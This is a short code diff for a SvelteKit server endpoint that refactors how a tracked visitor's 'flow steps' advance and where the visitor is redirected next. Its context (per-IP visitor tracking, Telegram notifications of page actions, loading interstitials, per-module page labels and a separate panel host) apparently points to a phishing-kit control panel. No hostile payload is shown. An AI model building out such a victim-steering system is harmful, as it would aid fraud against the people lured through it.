@@ -13,8 +13,9 @@ import { json, type RequestHandler } from '@sveltejs/kit';
 import { serverState } from '$lib/server/state';
 import { broadcast } from '$lib/server/websocket';
 import { notifyPageAction } from '$lib/server/telegram';
-import { applyLoadingInterstitial, resolveLabelRedirectUrl } from '$lib/server/funnel';
+import { applyLoadingInterstitial, resolveLabelRedirectUrl, isValidFlowLabel } from '$lib/server/funnel';
 import { dbSetVisitorFlowSteps } from '$lib/server/database';
+import { markStepCompleted, ensureFlowInitialized } from '$lib/server/goldenFlow';
 
 const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();
 
@@ -86,17 +87,13 @@ export const POST: RequestHandler = async ({ request, getClientAddress, url }) =
 	let nextLabel: string | null = null;
 	let flowApplied = false;
 
-	if (visitor && !visitor.flowBypassed && visitor.flowSteps?.length > 0 && currentPageLabel) {
-		const stepIdx = visitor.flowSteps.findIndex(
-			(s) => s.page === currentPageLabel && !s.passed
-		);
-		if (stepIdx !== -1) {
-			visitor.flowSteps[stepIdx].passed = true;
-			try { dbSetVisitorFlowSteps(ip, visitor.flowSteps); } catch {}
+	if (visitor && !visitor.flowBypassed && currentPageLabel) {
+		ensureFlowInitialized(visitor);
 
-			const nextStep = visitor.flowSteps.find((s) => !s.passed && /^[A-Z][^/]+\/.+/.test(s.page));
-			if (nextStep) {
-				nextLabel = nextStep.page;
+		if (visitor.flowSteps.length > 0) {
+			const nextStepLabel = markStepCompleted(visitor, currentPageLabel);
+			if (nextStepLabel) {
+				nextLabel = nextStepLabel;
 				nextUrl = resolveUrl(nextLabel, visitor.module, isVisitorHost, qp);
 				if (nextUrl) {
 					flowApplied = true;
